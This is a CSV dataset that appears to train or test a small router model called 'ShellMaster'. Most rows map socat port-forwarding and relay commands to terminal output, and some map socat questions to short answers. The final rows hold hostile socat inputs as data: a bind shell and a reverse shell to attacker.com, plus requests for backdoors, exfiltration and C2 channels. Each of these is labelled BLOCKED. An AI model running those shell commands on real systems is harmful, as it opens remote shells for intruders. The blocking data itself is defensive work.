prompt,system_prompt,adi_score,adi_decision,adi_metrics,response,routed_to,model,timestamp
socat TCP-LISTEN:8080 fork TCP:example.com:80,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:example.com:80",terminal_exec,smollm2-360m,2026-03-18T10:00:00
socat TCP-LISTEN:2222 fork TCP:192.168.1.10:22,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2222,fork TCP:192.168.1.10:22",terminal_exec,smollm2-360m,2026-03-18T10:00:01
socat UDP-LISTEN:53 fork UDP:8.8.8.8:53,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:02
socat -d -d TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -d -d TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:03
socat TCP-LISTEN:3306 fork TCP:db-server:3306,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:3306,fork TCP:db-server:3306",terminal_exec,smollm2-360m,2026-03-18T10:00:04
socat TCP-LISTEN:5432 fork TCP:postgres:5432,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:05
socat TCP-LISTEN:6379 fork TCP:redis:6379,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:6379,fork TCP:redis:6379",terminal_exec,smollm2-360m,2026-03-18T10:00:06
socat TCP-LISTEN:9200 fork TCP:elasticsearch:9200,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:9200,fork TCP:elasticsearch:9200",terminal_exec,smollm2-360m,2026-03-18T10:00:07
socat TCP-LISTEN:5900 fork TCP:vnc-server:5900,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:5900,fork TCP:vnc-server:5900",terminal_exec,smollm2-360m,2026-03-18T10:00:08
socat TCP-LISTEN:3389 fork TCP:rdp-server:3389,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3389,fork TCP:rdp-server:3389",terminal_exec,smollm2-360m,2026-03-18T10:00:09
socat UNIX-LISTEN:/tmp/sock fork TCP:remote:8080,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:10
socat /dev/ttyS0 rawer TCP-LISTEN:2323,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.7,0.0}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:11
socat -v TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.4,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:12
socat -T 30 TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:13
socat TCP-LISTEN:8080 reuseaddr fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:14
socat -6 TCP-LISTEN:8080 fork TCP ipv6 target:80,You are the ShellMaster. High-speed terminal router. Category: socat_ipv6.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat -6 TCP-LISTEN:8080,fork TCP:[2001:db8::1]:80",terminal_exec,smollm2-360m,2026-03-18T10:00:15
socat TCP-LISTEN:8080 bind=192.168.1.1 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,bind=192.168.1.1,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:16
socat TCP-LISTEN:8080 su=nobody fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:17
socat UDP-LISTEN:514 fork UDP:syslog-server:514,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:514,fork UDP:syslog-server:514",terminal_exec,smollm2-360m,2026-03-18T10:00:18
socat UDP-LISTEN:161 fork UDP:snmp-server:161,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:161,fork UDP:snmp-server:161",terminal_exec,smollm2-360m,2026-03-18T10:00:19
socat UDP-LISTEN:123 fork UDP:ntp-server:123,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.1,0.3,0.0}","ShellMaster Unix: socat UDP-LISTEN:123,fork UDP:ntp-server:123",terminal_exec,smollm2-360m,2026-03-18T10:00:20
socat TCP-LISTEN:25 fork TCP:mail-server:25,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:25,fork TCP:mail-server:25",terminal_exec,smollm2-360m,2026-03-18T10:00:21
socat TCP-LISTEN:9090 fork TCP:prometheus:9090,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:9090,fork TCP:prometheus:9090",terminal_exec,smollm2-360m,2026-03-18T10:00:22
socat TCP-LISTEN:3000 fork TCP:grafana:3000,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3000,fork TCP:grafana:3000",terminal_exec,smollm2-360m,2026-03-18T10:00:23
socat TCP-LISTEN:6443 fork TCP:k8s-api:6443,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:6443,fork TCP:k8s-api:6443",terminal_exec,smollm2-360m,2026-03-18T10:00:24
socat TCP-LISTEN:2375 fork TCP:docker-api:2375,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:25
socat OPENSSL-LISTEN:443 cert=server.pem verify=0 fork TCP:localhost:80,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:26
socat TUN:10.0.0.1 netmask 24 up TCP:remote:port,You are the ShellMaster. High-speed terminal router. Category: socat_tun.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat TUN:10.0.0.1/24,up TCP:remote:port",terminal_exec,smollm2-360m,2026-03-18T10:00:27
socat READLINE TCP:localhost:23,You are the ShellMaster. High-speed terminal router. Category: socat_interactive.,-1.5,HIGH_PRIORITY,"{0.0,1.0,0.6,0.9,0.1,0.5,0.0}",ShellMaster Unix: socat READLINE TCP:localhost:23,terminal_exec,smollm2-360m,2026-03-18T10:00:28
socat TCP-LISTEN:8080 fork range=192.168.1.0/24 TCP:internal:80,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:29
socat -v TCP-LISTEN:8080 fork TCP:target:80 log to file,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:30
forward local port 8080 to remote web server,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:remote:80",terminal_exec,smollm2-360m,2026-03-18T10:00:31
tunnel SSH through port 443,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.2,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:443,fork TCP:ssh-server:22",terminal_exec,smollm2-360m,2026-03-18T10:00:32
relay DNS queries to google with socat,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:33
expose serial port over network with socat,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.5,0.2}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:34
ssl termination on port 443 with socat,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.2,0.6,0.1}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:35
socat listener with timeout and reuseaddr,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.4,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:36
forward traffic to docker api,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:37
log all traffic through socat tunnel,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.0,0.4,0.2}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:38
restrict socat listener to subnet,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:39
run socat listener as unprivileged user,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-0.8,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:40
forward unix socket to tcp port,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:41
forward postgres traffic through socat,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:42
what is socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}",ShellMaster: Socat is a bidirectional data relay tool for connecting two data channels.,conversational,smollm2-360m,2026-03-18T10:00:43
socat vs netcat,You are the ShellMaster. Conversational Assistant. Category: general.,2.5,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat is more powerful than netcat with SSL, UNIX sockets and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:44
what does fork do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.2,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: fork spawns a child process per connection so multiple clients can connect simultaneously.,conversational,smollm2-360m,2026-03-18T10:00:45
what does reuseaddr do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.3,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: reuseaddr allows binding to a port in TIME_WAIT state so socat can restart quickly.,conversational,smollm2-360m,2026-03-18T10:00:46
what is the -v option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -v option prints data flowing through socat to stderr for debugging.,conversational,smollm2-360m,2026-03-18T10:00:47
what is the -T option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.9,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -T option sets an inactivity timeout in seconds after which socat closes the connection.,conversational,smollm2-360m,2026-03-18T10:00:48
how to install socat on ubuntu,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.5,0.2,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Install socat on Ubuntu with sudo apt install socat.,conversational,smollm2-360m,2026-03-18T10:00:49
does socat support ssl,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports SSL via OPENSSL-LISTEN and OPENSSL-CONNECT address types.,conversational,smollm2-360m,2026-03-18T10:00:50
can socat handle ipv6,You are the ShellMaster. Conversational Assistant. Category: general.,2.1,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports IPv6 with the -6 flag and TCP6/UDP6 address types.,conversational,smollm2-360m,2026-03-18T10:00:51
socat address types overview,You are the ShellMaster. Conversational Assistant. Category: general.,2.8,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat supports TCP, UDP, UNIX, OPENSSL, PTY, EXEC and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:52
create reverse shell with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation reverse_shell is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:53
socat TCP-LISTEN:4444 fork EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.0,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation bind_shell_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:54
socat TCP attacker.com:6666 EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,17.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation reverse_shell_exec is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:55
create persistent backdoor with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,19.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation persistent_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:56
bypass corporate firewall with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,15.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_firewall_bypass is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:57
socat data exfiltration tunnel,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.5,BLOCKED,"{0.2,0.8,0.5,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation data_exfiltration is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:58
socat covert c2 channel,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation covert_c2_channel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:59
socat direct memory access /dev/mem,You are the ShellMaster. Security Enforcement. Category: dangerous.,20.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation direct_memory_access is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:00
tunnel without authorization through company proxy,You are the ShellMaster. Security Enforcement. Category: dangerous.,14.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_proxy_tunnel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:01
socat destructive command exec,You are the ShellMaster. Security Enforcement. Category: dangerous.,25.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation destructive_command is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:02
